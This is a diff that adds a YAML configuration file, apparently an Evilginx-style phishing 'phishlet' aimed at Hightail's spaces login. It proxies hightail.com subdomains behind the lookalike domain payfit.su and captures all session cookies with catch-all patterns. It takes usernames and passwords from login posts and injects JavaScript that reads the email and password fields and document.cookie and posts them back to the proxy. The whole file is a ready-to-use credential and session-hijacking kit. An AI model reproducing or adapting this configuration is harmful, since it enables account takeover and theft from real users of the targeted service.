@@ -1,0 +1,76 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'api.spaces', orig_sub: 'api.spaces', domain: 'hightail.com', session: true}
+  - {phish_sub: '', orig_sub: '', domain: 'hightail.com', session: true}
+  - {phish_sub: 'spaces', orig_sub: 'spaces', domain: 'hightail.com', session: true}
+  - {phish_sub: 'web-cdn.spaces', orig_sub: 'web-cdn.spaces', domain: 'hightail.com'}
+sub_filters:
+  - {triggers_on: 'api.spaces.hightail.com', orig_sub: 'api.spaces', domain: 'hightail.com', search: 'hightail.com', replace: 'payfit.su', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.hightail.com'
+    keys: ['.*,regexp']
+  - domain: 'spaces.hightail.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/api/v1/subscription'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'cookies'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'spaces.hightail.com'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["spaces.hightail.com"]
+    trigger_paths: ["/login", "/send"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+
+          if (window.location.href.indexOf("login") > -1) { 
+
+        var submit = document.querySelectorAll('button[class="submit hollow"]')[0];
+        submit.setAttribute("onclick", "sendPass()", 500);
+         } else {
+
+        }
+      }
+      function sendPass(){
+
+            if (window.location.href.indexOf("login") > -1) { 
+
+        var username = document.getElementsByName("email")[0].value;
+        var pass = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("username="+encodeURIComponent(username)+"&password="+encodeURIComponent(pass));
+       
+            } else if (window.location.href.indexOf("send") > -1) {
+
+        var cookies = document.cookie;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/touhou', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("cookies="+encodeURIComponent(cookies));
+       
+   
+        } else {
+
+        }
+      }
+
+      setTimeout(function(){ onclickListener(); }, 5000);
+  
+      setTimeout(function(){ sendPass(); }, 3500);
